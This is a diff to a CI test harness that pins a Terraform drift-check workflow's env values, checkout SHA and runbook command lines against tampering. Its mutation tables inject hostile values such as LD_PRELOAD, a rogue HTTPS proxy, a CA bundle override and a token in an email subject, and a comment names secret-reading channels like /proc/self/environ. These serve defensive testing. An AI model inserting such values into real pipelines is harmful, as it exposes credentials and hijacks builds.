@@ -26,7 +26,7 @@
 # case of a multi-case row (fold_inv folds the earlier cases in; H7), not only the last one, and under the entry of the
 # case they belong to (switch_entry folds before the constants move). H11-H17 are the negative controls of the matrix
 # context, the issue-store id ban, the N1c/N3 document bounds, the text helpers and N4. FLOOR and TABLE_ROWS are the realized
-# counts of the two-entry suite (278 assertions, 149 table rows). Edits to ADR-119, runbook 6604 and workspaces-luks.tf select
+# counts of the two-entry suite (284 assertions, 149 table rows). Edits to ADR-119, runbook 6604 and workspaces-luks.tf select
 # this suite too (scripts/lib/test-affected-paths.sh), because N1c, N3 and WR1 read them.
 #
 # EQUIVALENT MUTANTS and known limits (each proven in a sandbox, none a gap in a row):
@@ -39,13 +39,11 @@
 #   * a leak of a NON-prefix slice of a token (e.g. its last 8 characters) is a declared limit: the invariant scans the whole
 #     value and its first 6 characters only.
 #   * the Doppler tarball and `timeout` behaviour are exercised under stubs only (no network).
-#   * N1c's read-back equality (`"$_r" == "v1/volumes/$3"`) is EQUIVALENT to its file-wide id set `_f`, which also reads the
-#     read-back line: a read-back naming another id puts a second id in `_f`. Kept for the failure line it prints.
 #   * id_placement does not see a row value written with a YAML escape beside a comment naming the id (see id_placement).
-#   * rb_line_ok's exact-wrapper prefix is EQUIVALENT to its tail check, which strips that wrapper: on a line that does not start
-#     with it, the text after the first quote is the wrapper body, never a bare comment. Deleting both reds H15 (wrapper-*).
-#   * a count of rb_line_ok's stdin construct is EQUIVALENT (so not kept): without it the curl grammar sees the whole line, and a
-#     second copy is a fourth token name.
+#   * the job-timeout clause `not jt > sum(bounds)` is EQUIVALENT (kept as defence in depth): every step bound is pinned to
+#     its exact value (the seven sum to 16 < 20), STEP_KEYSET forbids `timeout-minutes` on gate and notify, and step-sequence
+#     forbids a new step, so no edit reaches the sum without one of those firing first (S2 `r2 a timeout-minutes on the gate`
+#     names the label that does fire).
 #
 # Run: bash plugins/soleur/test/sole-copy-drift-check.test.sh
 # Override the workflow under test (mutation proofs on a COPY): SOLE_COPY_DRIFT_WF=/path/to/copy.yml
@@ -54,7 +52,7 @@ set -uo pipefail
 export TMPDIR="${TMPDIR:-/var/tmp}"
 
 # ANTI-VACUITY FLOOR at the REALIZED count (the number here and the number the run prints must agree).
-FLOOR=278
+FLOOR=284
 # Rows of the case table (every end_row call before the harness section), declared apart from the counters so
 # deleting one is a diff here (H3).
 TABLE_ROWS=149
@@ -166,13 +164,16 @@ GH_STEPS = {"tf_commit", "file_finding", "file_unreadable", "clear"}
 # under stubs, models every `uses:` step as a success it never runs, never applies the workflow `env:`, and evaluates only the
 # four expression contexts below. Whatever it does not model is pinned here to the one value the file has, so an edit to it
 # is a named S1 violation, never a run that diverges from the runner while every executed row stays green. What is pinned:
-# the workflow keys, concurrency and env NAMES; the job keys and runs-on; the ordered step list (the checkout, then the
-# eight ids); each step's key set, env NAMES and `if:` (whitespace-collapsed); the checkout's `uses` (a 40-hex SHA) and
-# `with`; the notify step's `uses` and `with` values; the expression context roots every `if:`, `env:`, `with:` and `name:`
-# may name. Values inside env bindings are NOT pinned here: the executed rows see them (each row runs the real bodies).
+# the workflow keys, concurrency, and env names AND values; the job keys and runs-on; the ordered step list (the checkout,
+# then the eight ids); each step's key set, env names AND each env value (the exact string), and `if:` (whitespace-collapsed);
+# the checkout's `uses` (the exact SHA) and `with`; the notify step's `uses` and `with` values; the expression context roots
+# every `if:`, `env:`, `with:` and `name:` may name. Env values are pinned because the harness renders them with a FIXTURE
+# `github` context (repository o/r, run_id 77) and with gha-expr.py's operator precedence (`!` binds looser than `==` there,
+# tighter on GitHub), so a value that branches on either renders one way here and another on the runner (review
+# verification pass, V1); the executed rows see only the harness's rendering.
 WF_KEYS = {"name", "on", "concurrency", "permissions", "env", "jobs"}
 WF_CONCURRENCY = {"group": "terraform-drift", "cancel-in-progress": False}
-WF_ENV = ["TERRAFORM_VERSION", "TF_VAR_terraform_version"]
+WF_ENV = {"TERRAFORM_VERSION": "1.10.5", "TF_VAR_terraform_version": "1.10.5"}
 JOB_KEYS = {"name", "if", "runs-on", "timeout-minutes", "strategy", "steps"}
 RUNS_ON = "ubuntu-24.04"
 STEP_SEQ = [None] + STEP_IDS       # None is the checkout, the one step without an id
@@ -187,14 +188,22 @@ STEP_KEYSET = {
     "notify": ["continue-on-error", "id", "if", "name", "uses", "with"],
     "gate": ["env", "id", "if", "name", "run"],
 }
-STEP_ENV = {
-    "doppler_cli": ["DOPPLER_CLI_SHA256", "DOPPLER_CLI_VERSION"],
-    "tf_commit": ["GH_TOKEN", "REPOSITORY", "TF_PATH"],
-    "probe": ["DOPPLER_CONFIG", "DOPPLER_PROJECT", "DOPPLER_TOKEN", "ENTRY", "PIN", "SUBJECT", "TF_COMMIT_EPOCH", "TF_PATH", "TF_RESOURCE"],
-    "file_finding": ["ENTRY", "EXPECTED", "GH_REPO", "GH_TOKEN", "HTTP", "LIVE", "NAME", "REPOSITORY", "RUN_ID", "SERVER_URL", "SUBJECT", "TF_AGE_MIN", "VERDICT"],
-    "file_unreadable": ["ADR", "GH_REPO", "GH_TOKEN", "HTTP", "NAME", "REPOSITORY", "RUN_ID", "SERVER_URL", "SUBJECT", "VERDICT"],
-    "clear": ["GH_REPO", "GH_TOKEN", "NAME", "REPOSITORY", "RUN_ID", "SERVER_URL", "SUBJECT"],
-    "gate": ["ENTRY", "HTTP", "VERDICT"],
+_GH = {"GH_TOKEN": "${{ github.token }}", "GH_REPO": "${{ github.repository }}"}
+_RUNLINK = {"SERVER_URL": "${{ github.server_url }}", "REPOSITORY": "${{ github.repository }}", "RUN_ID": "${{ github.run_id }}"}
+_PO = lambda k: "${{ steps.probe.outputs.%s }}" % k
+STEP_ENV = {   # step -> {env name: its exact value string}, taken from the job as it stands (review verification pass, V1)
+    "doppler_cli": {"DOPPLER_CLI_VERSION": "3.75.3", "DOPPLER_CLI_SHA256": "9c840cdd32cffff06d048329549ba2fa908146b385f21cd1d54bf34a0082d0db"},
+    "tf_commit": {"GH_TOKEN": "${{ github.token }}", "REPOSITORY": "${{ github.repository }}", "TF_PATH": "${{ matrix.tf_file }}"},
+    "probe": {"DOPPLER_TOKEN": "${{ secrets.DOPPLER_TOKEN }}", "DOPPLER_PROJECT": "soleur", "DOPPLER_CONFIG": "prd_terraform",
+              "TF_COMMIT_EPOCH": "${{ steps.tf_commit.outputs.epoch }}", "TF_PATH": "${{ matrix.tf_file }}",
+              "TF_RESOURCE": "${{ matrix.tf_resource }}", "PIN": "${{ matrix.volume_id }}", "SUBJECT": "${{ matrix.subject }}",
+              "ENTRY": "${{ matrix.entry }}"},
+    "file_finding": dict(_GH, ENTRY="${{ matrix.entry }}", SUBJECT="${{ matrix.subject }}", VERDICT=_PO("verdict"), NAME=_PO("name"),
+                         EXPECTED=_PO("expected"), LIVE=_PO("live"), HTTP=_PO("http"), TF_AGE_MIN=_PO("tf_age_min"), **_RUNLINK),
+    "file_unreadable": dict(_GH, SUBJECT="${{ matrix.subject }}", ADR="${{ matrix.adr }}", VERDICT=_PO("verdict"), NAME=_PO("name"),
+                            HTTP=_PO("http"), **_RUNLINK),
+    "clear": dict(_GH, SUBJECT="${{ matrix.subject }}", NAME=_PO("name"), **_RUNLINK),
+    "gate": {"VERDICT": _PO("verdict"), "HTTP": _PO("http"), "ENTRY": "${{ matrix.entry }}"},
 }
 _V = "steps.probe.outputs.verdict"
 STEP_IF = {
@@ -207,7 +216,7 @@ STEP_IF = {
     "notify": "always() && (%s == 'lifted-outside-terraform' || %s == 'volume-not-found' || %s)" % (_V, _V, " || ".join("steps.%s.outcome == '%s'" % (s, o) for s in ("file_finding", "file_unreadable", "clear") for o in ("failure", "cancelled"))),
     "gate": "always()",
 }
-CHECKOUT_USES = r"actions/checkout@[0-9a-f]{40}"
+CHECKOUT_USES = "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5"   # the exact SHA the job uses (V2), compared by equality
 NOTIFY_USES = "./.github/actions/notify-ops-email"
 NOTIFY_WITH = {
     "subject": "[INFRA DRIFT] ${{ matrix.subject }} protection check needs attention",
@@ -305,8 +314,11 @@ def violations(job, text, top):
     if top.get("concurrency") != WF_CONCURRENCY:
         v.append("wf-concurrency")
     wenv = top.get("env") if isinstance(top.get("env"), dict) else {}
-    if sorted(wenv) != WF_ENV or any("${{" in str(val) for val in wenv.values()):
+    if sorted(wenv) != sorted(WF_ENV) or any("${{" in str(val) for val in wenv.values()):
         v.append("wf-env")
+    for k in sorted(set(wenv) & set(WF_ENV)):
+        if wenv[k] != WF_ENV[k]:
+            v.append("wf-env-value:" + k)
     for k in sorted(set(job) - JOB_KEYS):
         v.append("job-key:" + k)
     if job.get("runs-on") != RUNS_ON:
@@ -323,8 +335,12 @@ def violations(job, text, top):
             v.append("step-key:%s:%s" % (sid, k))
         for k in sorted(set(STEP_KEYSET[key]) - set(s)):
             v.append("step-key-missing:%s:%s" % (sid, k))
-        if key in STEP_ENV and sorted((s.get("env") or {}).keys()) != STEP_ENV[key]:
+        senv = s.get("env") if isinstance(s.get("env"), dict) else {}
+        if key in STEP_ENV and sorted(senv) != sorted(STEP_ENV[key]):
             v.append("step-env:" + sid)
+        for k in sorted(set(senv) & set(STEP_ENV.get(key, {}))):
+            if senv[k] != STEP_ENV[key][k]:
+                v.append("step-env-value:%s:%s" % (sid, k))
         if ws(s.get("if")) != STEP_IF[key]:
             v.append("step-if:" + sid)
     # Every expression the harness evaluates reads only the four modelled contexts.
@@ -409,7 +425,7 @@ def violations(job, text, top):
     if len(cos) != 1:
         v.append("checkout-count:%d" % len(cos))
     co = cos[0] if cos else {}
-    if not re.fullmatch(CHECKOUT_USES, str(co.get("uses", ""))):
+    if co.get("uses") != CHECKOUT_USES:
         v.append("checkout-uses")
     if co.get("with") != {"persist-credentials": False}:
         v.append("checkout-with")
@@ -669,7 +685,15 @@ def mutants():
         ("r2 HTTPS_PROXY in the probe env", "step-env:probe", lambda j, t: (step(j, "probe")["env"].update({"HTTPS_PROXY": "http://127.0.0.1:9"}) or j, t)),
         ("r2 LD_PRELOAD in the probe env", "step-env:probe", lambda j, t: (step(j, "probe")["env"].update({"LD_PRELOAD": "/tmp/x.so"}) or j, t)),
         ("r2 a token in the email subject", "notify-with", lambda j, t: (step(j, "notify")["with"].update({"subject": "${{ github.token }}"}) or j, t)),
-        ("r2 a step bound raised so the bounds sum past the job cap", "job-timeout", lambda j, t: (setk(step(j, "gate"), "timeout-minutes", 5) and j, t)),
+        # The sum clause cannot fire alone (see EQUIVALENT MUTANTS): this names the label that does fire.
+        ("r2 a timeout-minutes on the gate (bound keys are pinned per step)", "step-key:gate:timeout-minutes", lambda j, t: (setk(step(j, "gate"), "timeout-minutes", 5) and j, t)),
+        # Verification pass: env VALUES the harness renders differently from the runner (fixture github context, gha-expr's `!`
+        # precedence), and the checkout SHA. Each changes one value inside the pinned shape.
+        ("v1 the probe's declaration path keyed on the real repository name", "step-env-value:probe:TF_PATH", lambda j, t: (step(j, "probe")["env"].update({"TF_PATH": "${{ github.repository == 'jikig-ai/soleur' && 'none.tf' || matrix.tf_file }}"}) or j, t)),
+        ("v1 the probe's declaration path behind a `!` whose precedence differs from GitHub's", "step-env-value:probe:TF_PATH", lambda j, t: (step(j, "probe")["env"].update({"TF_PATH": "${{ !matrix.entry == true && matrix.tf_file || 'none.tf' }}"}) or j, t)),
+        ("v1 the probe's resource keyed on the fixture run id", "step-env-value:probe:TF_RESOURCE", lambda j, t: (step(j, "probe")["env"].update({"TF_RESOURCE": "${{ github.run_id == '77' && matrix.tf_resource || 'none' }}"}) or j, t)),
+        ("v1 the commit-time read's path keyed on the real repository name", "step-env-value:tf_commit:TF_PATH", lambda j, t: (step(j, "tf_commit")["env"].update({"TF_PATH": "${{ github.repository == 'jikig-ai/soleur' && 'apps' || matrix.tf_file }}"}) or j, t)),
+        ("v2 the checkout on another 40-hex SHA", "checkout-uses", lambda j, t: (setk(step_first(j), "uses", "actions/checkout@0000000000000000000000000000000000000001") and j, t)),
     ]
 
 def wf_mutants():
@@ -692,6 +716,7 @@ def wf_mutants():
         ("r2 HTTPS_PROXY in the workflow env (the harness never applies the workflow env)", "wf-env", wenv("HTTPS_PROXY", "http://127.0.0.1:3128")),
         ("r2 CURL_CA_BUNDLE in the workflow env", "wf-env", wenv("CURL_CA_BUNDLE", "./ca.pem")),
         ("r2 LD_PRELOAD in the workflow env", "wf-env", wenv("LD_PRELOAD", "/tmp/x.so")),
+        ("v1 a workflow env value changed (the harness never applies the workflow env)", "wf-env-value:TERRAFORM_VERSION", wenv("TERRAFORM_VERSION", "1.10.6")),
     ]
 
 def cmd_shape(out, mode):
@@ -811,7 +836,7 @@ def cmd_run(specpath):
             rec["ran"] = True
             if "uses" in s:
                 # Only the two actions the job has are modelled (as a success that never runs); any other is a harness error.
-                if not (re.fullmatch(CHECKOUT_USES, str(s["uses"])) or s["uses"] == NOTIFY_USES):
+                if s["uses"] not in (CHECKOUT_USES, NOTIFY_USES):
                     sys.stderr.write("unmodelled action: %s\n" % s["uses"])
                     sys.exit(3)
                 rec["outcome"] = "success"
@@ -873,7 +898,7 @@ if (( _e2bad == 0 )); then pass "E2 every run body parses with bash -n"; fi
 # STATIC SHAPE (Guard 1 rows 2, 12, 13): the real job is clean, and each in-process mutation is flagged.
 # ---------------------------------------------------------------------------------------------------------
 _sv=$(python3 -I "$TMP/h.py" shape "$TMP/x" real) || fatal "shape check crashed"
-if [[ -z "$_sv" ]]; then pass "S1 the job shape is clean: the workflow keys and env names, the job keys, the ordered step list (checkout + 8 ids), each step's keys, env names and if:, the checkout (SHA-pinned) and notify actions and their with:, and every expression context root equal their pinned sets; no loader, mutable installer, read/write token, stray secret, expression in a run body, xtrace or continue-on-error beyond notify"
+if [[ -z "$_sv" ]]; then pass "S1 the job shape is clean: the workflow keys and env names and values, the job keys, the ordered step list (checkout + 8 ids), each step's keys, env names and values and if:, the checkout (its exact SHA) and notify actions and their with:, and every expression context root equal their pinned sets; no loader, mutable installer, read/write token, stray secret, expression in a run body, xtrace or continue-on-error beyond notify"
 else fail "S1 job shape violations: $(tr '\n' ' ' <<<"$_sv")$(grep -q '^matrix-shape' <<<"$_sv" && printf ' (matrix-shape: see ADDING AN ENTRY in the job comment)')"; fi
 _sm=$(python3 -I "$TMP/h.py" shape "$TMP/x" mutants) || fatal "shape mutation table crashed"
 _smn=0
@@ -1269,16 +1294,27 @@ invariants() { # the checks every case owes, whatever it asserts
   done < <(cat "$CASE/probe.log" "$CASE/gate.log" 2>/dev/null | grep -F 'sole-copy-check verdict=' | grep -v '^::warning::' || true)
   # ...and the lines are THERE (review round 2): a probe that ran its real body prints its finish line exactly once (none when its
   # EXIT trap published instead), and a gate that ran prints exactly one verdict line, clean or ::error::.
+  # The verdict each line names is the PUBLISHED one (review verification pass, V4): the re-protect tracker's event-grep reads the
+  # log line, so a line that says matches-declared while the probe published another verdict would close it as PASS. The
+  # published verdict is the probe's last `verdict=` output (the value the gate's VERDICT renders from); the gate prints `none`
+  # for an empty one.
   if [[ -f "$CASE/result.json" ]]; then
-    local _want _got
+    local _want _got _pv _lv
+    _pv=$(sed -n 's/^verdict=//p' "$CASE/out/probe" 2>/dev/null | tail -n 1)
     if [[ "$(rs probe ran)" == true ]] && ! printf '%s\n' "${BODIES[@]}" | grep -q '^probe='; then
       _want=1; if grep -qF 'probe ended without a verdict' "$CASE/probe.log" 2>/dev/null; then _want=0; fi
       _got=$(grep -c '^sole-copy-check verdict=' "$CASE/probe.log" 2>/dev/null) || _got=0
       [[ "$_got" == "$_want" ]] || CHK+=$'\n    '"the probe printed $_got verdict line(s), want $_want"
+      while IFS= read -r _lv; do
+        [[ "$_lv" == "$_pv" ]] || CHK+=$'\n    '"the probe's verdict line says verdict=$_lv, the published verdict is '$_pv'"
+      done < <(sed -n 's/^sole-copy-check verdict=\([^ ]*\).*/\1/p' "$CASE/probe.log" 2>/dev/null)
     fi
     if [[ "$(rs gate ran)" == true ]]; then
       _got=$(grep -cE '^(::error::)?sole-copy-check verdict=' "$CASE/gate.log" 2>/dev/null) || _got=0
       [[ "$_got" == 1 ]] || CHK+=$'\n    '"the gate printed $_got verdict line(s), want 1"
+      while IFS= read -r _lv; do
+        [[ "$_lv" == "${_pv:-none}" ]] || CHK+=$'\n    '"the gate's verdict line says verdict=$_lv, the published verdict is '${_pv:-none}'"
+      done < <(sed -n 's/^\(::error::\)\{0,1\}sole-copy-check verdict=\([^ ]*\).*/\2/p' "$CASE/gate.log" 2>/dev/null)
     fi
   fi
   if [[ -f "$CASE/out/probe" ]] && grep -q '<<' "$CASE/out/probe"; then CHK+=$'\n    '"a heredoc-form output reached the probe's GITHUB_OUTPUT"; fi
@@ -2074,43 +2110,39 @@ PYP
 if [[ "$_dl" == same ]] && grep -qxF -- 'echo "${DOPPLER_CLI_SHA256}  $d/doppler.tar.gz" | sha256sum -c -' "$TMP/x/steps/doppler_cli.sh" && grep -qxF -- 'echo "$d" >> "$GITHUB_PATH"' "$TMP/x/steps/doppler_cli.sh"; then pass "N2 the job's Doppler CLI version and sha256 equal the loader's, and the tarball is verified with sha256sum -c"
 else fail "N2 Doppler CLI pin: $_dl"; fi
 # The read-only command lines of runbook 6604 (the read-back subsection's one `doppler run` line, and the four of "Verify the retired
-# end state"; only the command lines, so the outcome table and the prose may still name the flags and say it does not fall back).
-# Each line is pinned to the exact constructs it has, never to a list of banned spellings (review round 2): it STARTS with the exact
-# wrapper (the read-only token only, then the token check); it carries the exact printf-to-stdin construct, and curl's
-# arguments after it follow a closed grammar (RB_CURL: no other flag, so no argv header in any spelling); the token name
-# appears exactly three times (--only-secrets, the check, the printf argument), so no other channel (an argv header in any
-# spelling, -u, --oauth2-bearer, a URL with credentials, a variable built from it) can read it; `Authorization` appears once; the
-# read/write name never appears; and after the wrapper's closing quote (the first one after its opening quote) there is nothing but
-# an optional `# comment` (a `| jq` moved outside the wrapper would be fed the `missing-token` word).
+# end state"; only those two fenced blocks, so the outcome table and the prose may still name the flags and say it does not fall back).
+# Pinned as an EXACT text, never a grammar or a list of banned spellings (review verification pass, V3): the read-back
+# section's first fenced block holds exactly RB line R, and the verify block's first fenced block exactly lines V1-V4, byte for
+# byte once the fence's own indentation is removed; the only slot is the web1 pin, read from the workflow row. What this
+# guarantees: any other text in either block (a second command, `env`/`printenv`/`/proc/self/environ` piped anywhere, a
+# spliced token name, a curlrc written and exported, an argv header in any spelling, a dropped `--disable`, another
+# wrapper or quoting) is a diff from the pin and reds N3. What it relies on: `--disable --noproxy "*"` first, as
+# scripts/lib/bearer-curl.sh does, so curl reads no curlrc and honours no proxy variable from the operator's environment.
+# What it does not cover: the operator's own `doppler`, `sh`, `curl` and `jq` binaries and the rest of their environment
+# (the TLS trust store variables included), and prose outside the two blocks.
 RB_WRAP='doppler run -p soleur -c prd_terraform --only-secrets HCLOUD_TOKEN_READONLY --no-exit-on-missing-only-secrets -- sh -c '"'"'[ -n "$HCLOUD_TOKEN_READONLY" ] || { echo missing-token; exit 3; }; '
-RB_STDIN='printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl -sS --config - '
-# curl's arguments after the stdin config, as a closed grammar: the bound, then only -o /dev/null and -w "<format>", then one
-# Hetzner URL (quoted or bare) and what ends it (the wrapper's quote, a pipe, or the closing parenthesis of a $( )).
-RB_CURL='^--max-time 30 (-o /dev/null )?(-w "[^"]*" )?("https://api[.]hetzner[.]cloud/v1/[^" ]+"|https://api[.]hetzner[.]cloud/v1/[^"'"'"' )|]+)('"'"'| [|]|[)])'
-rb_line_ok() { # rb_line_ok <one doppler run line>: 0 when it has that shape
-  local l="${1#"${1%%[![:space:]]*}"}"
-  [[ "$l" == "$RB_WRAP"* ]] || return 1
-  # Anchored on the stdin construct: without it the line is left whole and cannot start with --max-time (a second copy of the
-  # construct is a fourth token name, below).
-  [[ "${l#*"$RB_STDIN"}" =~ $RB_CURL ]] || return 1
-  [[ "$(grep -oF -e 'HCLOUD_TOKEN_READONLY' <<<"$l" | wc -l | tr -d ' ')" == 3 ]] || return 1
-  [[ "$(grep -oF -e '--only-secrets' <<<"$l" | wc -l | tr -d ' ')" == 1 ]] || return 1
-  [[ "$(grep -oF 'Authorization' <<<"$l" | wc -l | tr -d ' ')" == 1 ]] || return 1
-  if grep -qE 'HCLOUD_TOKEN([^_]|$)' <<<"$l"; then return 1; fi
-  # The wrapper body cannot hold a single quote, so it ends at the first one after the wrapper's opening quote.
-  local rest="${l#"$RB_WRAP"}"
-  [[ "$rest" == *\'* && "${rest#*\'}" =~ ^([[:space:]]+#.*)?$ ]] || return 1
-  return 0
+RB_HDR='printf "header = \"Authorization: Bearer %s\"\n" "$HCLOUD_TOKEN_READONLY" | curl --disable --noproxy "*" -sS --config - --max-time 30 '
+rb_expected() { # rb_expected <web1-pin>: the two blocks as rb_blocks prints them
+  local p="$1" q="'"
+  printf '%s\n' '@@read-back@@' \
+    "$RB_WRAP"'r=$('"$RB_HDR"'-w "\n%{http_code}" https://api.hetzner.cloud/v1/volumes/'"$p"') || { echo read-failed; exit 2; }; case "$(printf %s "$r" | tail -n 1)" in 200) w=$(printf %s "$r" | sed "\$d" | jq -r "if .volume.protection.delete == true then \"protected\" elif .volume.protection.delete == false then \"not-protected\" else \"read-failed\" end" 2>/dev/null);; 404) w=volume-gone;; *) w=read-failed;; esac; case "$w" in protected) echo protected;; not-protected) echo not-protected; exit 1;; volume-gone) echo volume-gone; exit 4;; *) echo read-failed; exit 2;; esac'"$q" \
+    '@@verify@@' \
+    "$RB_WRAP$RB_HDR"'-o /dev/null -w "%{http_code}\n" https://api.hetzner.cloud/v1/volumes/105149570'"$q"'   # expect 404' \
+    "$RB_WRAP$RB_HDR"'https://api.hetzner.cloud/v1/servers/123931471 | jq -c ".server.volumes"'"$q"'   # expect ['"$p"']' \
+    "$RB_WRAP$RB_HDR"'"https://api.hetzner.cloud/v1/volumes?name=soleur-web-platform-data" | jq -c "[.volumes[].id]"'"$q"'   # expect []' \
+    "$RB_WRAP$RB_HDR"'https://api.hetzner.cloud/v1/volumes/'"$p"' | jq ".volume.protection.delete"'"$q"'   # expect true after the SSH-stage apply'
 }
-rb_cmdline_ok() { # rb_cmdline_ok <runbook-6604>: 0 when the read-back line and each of the four verify-block lines has that shape
-  local l n=0
-  l=$(rb_section "$1" | grep -E '^[[:space:]]*doppler run ') || return 1
-  [[ "$(grep -c . <<<"$l")" == 1 ]] || return 1
-  rb_line_ok "$l" || return 1
-  while IFS= read -r l; do
-    n=$((n + 1)); rb_line_ok "$l" || return 1
-  done < <(vb_section "$1" | grep -E '^[[:space:]]*doppler run ')
-  [[ "$n" == 4 ]]
+fence1() { # fence1: stdin's first fenced block, each line with the opening fence's indentation removed (a line without it is marked)
+  awk 'f == 0 && /^[ ]*```/ { match($0, /^[ ]*/); ind = substr($0, 1, RLENGTH); f = 1; next }
+       f == 1 && /^[ ]*```[ ]*$/ { exit }
+       f == 1 { if (substr($0, 1, length(ind)) == ind) print substr($0, length(ind) + 1); else print "@@indent@@" $0 }'
+}
+rb_blocks() { # rb_blocks <runbook-6604>
+  printf '%s\n' '@@read-back@@'; rb_section "$1" | fence1
+  printf '%s\n' '@@verify@@'; vb_section "$1" | fence1
+}
+rb_cmdline_ok() { # rb_cmdline_ok <runbook-6604> <web1-pin>: 0 when both blocks are exactly the pinned text
+  [[ -n "$2" && "$(rb_blocks "$1")" == "$(rb_expected "$2")" ]]
 }
 _ff=$(cat "$TMP/x/steps/file_finding.sh"); _fu=$(cat "$TMP/x/steps/file_unreadable.sh")
 _n3=""
@@ -2136,8 +2168,8 @@ done < <(jq -r '.[] | objects | .adr // "none"' "$TMP/x/rows.json")
 n3 grep -qF 'D1 — the sole copy is protected in Terraform' "$ADR119"
 n3 grep -q '^## Addendum (2026-10-08): the plaintext backstop is retired' "$ADR119"
 n3 test "$(grep -cx '## Read back the delete-protection flag (read-only token)' "$RB6604")" = 1
-n3 rb_cmdline_ok "$RB6604"
-if [[ -z "$_n3" ]]; then pass "N3 every pointer the filer text makes resolves: ADR-282, runbook 5c, its not-protected row, the Delivery route text naming manual-rerun, After a total loss, the soleur:incident skill file, step O5 of infra-credential-tiers-8209.md, every row's ADR file, ADR-119 D1 and its 2026-10-08 addendum, runbook 6604's read-only read-back section and its command line"
+n3 rb_cmdline_ok "$RB6604" "$_wpin"
+if [[ -z "$_n3" ]]; then pass "N3 every pointer the filer text makes resolves: ADR-282, runbook 5c, its not-protected row, the Delivery route text naming manual-rerun, After a total loss, the soleur:incident skill file, step O5 of infra-credential-tiers-8209.md, every row's ADR file, ADR-119 D1 and its 2026-10-08 addendum, runbook 6604's read-only read-back section, and its read-back and verify blocks equal to the pinned five lines"
 else fail "N3 a filer pointer does not resolve:$_n3"; fi
 # N4 (CTO rulings 20 and 28): the web-1 re-protect forcing function is stated the same way in ADR-119's 2026-11-10 addendum and in
 # the sole-copy job's OWN comment block (the run of comment lines directly above the job header, after the last blank or
@@ -2148,20 +2180,29 @@ job_comment() { # job_comment <workflow>: the sole-copy job's own comment block,
   awk '/^  sole-copy-protection-check:/{printf "%s", b; exit} /^[[:space:]]*#/{b = b $0 "\n"; next} {b = ""}' "$1" \
     | sed -E 's/^[[:space:]]*# ?//' | tr '\n' ' ' | tr -s ' '
 }
-N4_NEED=('dated re-protect follow-through issue' 'never the Date shape' 'sole-copy-check verdict=matches-declared entry=web1')
-# Any sentence pairing B4 with "forcing function", in either word order (the ruling's two literal forms are inside it), and the
-# Date-shape trigger phrase of the follow-through convention.
-N4_BAN='forcing function is Guard B4|Guard B4 (is|as) (the|a|its) forcing function|B4[^.]*forcing function|forcing function[^.]*B4|Re-evaluate by'
+# Both texts also state the probe's exit codes and leg condition in ruling 28's exact words (review verification pass, V5): the
+# leg "succeeded and emitted" the marker, and the past-date exit is 5 ("after it 5 (ACTION REQUIRED)" in the addendum, "5 after
+# it" in the job comment), so an edit back to a Date-shape closure (exit 0 past the date, or a leg that merely ran) is red.
+N4_NEED=('dated re-protect follow-through issue' 'never the Date shape' 'sole-copy-check verdict=matches-declared entry=web1' 'succeeded and emitted')
+N4_NEED_ADR=('after it 5 (ACTION REQUIRED)')
+N4_NEED_JOB=('2 before the issue'"'"'s date and 5 after it')
+# The ruling's two literal forms of pairing B4 with "forcing function", and the Date-shape trigger phrases of the follow-through
+# convention (either preposition), case-insensitive. The either-order pairing is checked per sentence below.
+N4_BAN='forcing function is Guard B4|Guard B4 (is|as) (the|a|its) forcing function|Re-evaluate (by|on)'
+n4_sentences() { sed -E 's/\. /.\n/g'; }   # one sentence per line: split on a period followed by a space (a dotted path stays whole)
 n4() { # n4 <adr-119> <workflow>: prints one line per failure, nothing when both agree
-  local _s _t _p
+  local _s _t _p _need
   for _s in adr job; do
-    if [[ "$_s" == adr ]]; then _t=$(adr_section "$1" | tr '\n' ' ' | tr -s ' '); else _t=$(job_comment "$2"); fi
-    for _p in "${N4_NEED[@]}"; do grep -qF -- "$_p" <<<"$_t" || printf '%s: lacks "%s"\n' "$_s" "$_p"; done
+    if [[ "$_s" == adr ]]; then _t=$(adr_section "$1" | tr '\n' ' ' | tr -s ' '); _need=("${N4_NEED[@]}" "${N4_NEED_ADR[@]}")
+    else _t=$(job_comment "$2"); _need=("${N4_NEED[@]}" "${N4_NEED_JOB[@]}"); fi
+    for _p in "${_need[@]}"; do grep -qF -- "$_p" <<<"$_t" || printf '%s: lacks "%s"\n' "$_s" "$_p"; done
     if grep -qiE -- "$N4_BAN" <<<"$_t"; then printf '%s: %s\n' "$_s" "$(grep -oiE -- "$N4_BAN" <<<"$_t" | head -1)"; fi
+    _p=$(n4_sentences <<<"$_t" | grep -wiE 'B4' | grep -iE 'forcing function' | head -1) || _p=""
+    [[ -z "$_p" ]] || printf '%s: a sentence pairs B4 with "forcing function": %s\n' "$_s" "$(head -c 160 <<<"$_p")"
   done
 }
 _n4=$(n4 "$ADR119" "$WF")
-if [[ -z "$_n4" ]]; then pass "N4 ADR-119's 2026-11-10 addendum and the sole-copy job's own comment block both name the dated re-protect follow-through issue, its event-grep probe (never the Date shape) and the web1 marker, and neither pairs Guard B4 with 'forcing function' or names the Date-shape trigger"
+if [[ -z "$_n4" ]]; then pass "N4 ADR-119's 2026-11-10 addendum and the sole-copy job's own comment block both name the dated re-protect follow-through issue, its event-grep probe (never the Date shape), the web1 marker, a leg that succeeded and emitted it and exit 5 past the date, and neither pairs Guard B4 with 'forcing function' in one sentence or names the Date-shape trigger"
 else fail "N4 the web-1 re-protect forcing function: $(tr '\n' ';' <<<"$_n4")"; fi
 
 # ---------------------------------------------------------------------------------------------------------
@@ -2232,7 +2273,10 @@ _iv_noentry() { printf 'sole-copy-check verdict=matches-declared expected=true l
 _iv_otherentry() { printf 'sole-copy-check verdict=matches-declared entry=%s (clean)\n' "$OTHER_ENTRY" > "$CASE/gate.log"; }
 _iv_entrylate() { printf '::error::sole-copy-check verdict=could-not-read http=500 entry=%s \n' "$ENTRY" > "$CASE/gate.log"; }
 _iv_ran() { printf '{"steps":{"probe":{"ran":true},"gate":{"ran":true}}}\n' > "$CASE/result.json"; }   # both steps ran
-_iv_entryok() { _iv_ran; printf 'sole-copy-check verdict=matches-declared entry=%s expected=true\n::warning::sole-copy-check verdict=x: a note\n' "$ENTRY" > "$CASE/probe.log"; printf 'sole-copy-check verdict=matches-declared entry=%s (clean)\n' "$ENTRY" > "$CASE/gate.log"; }
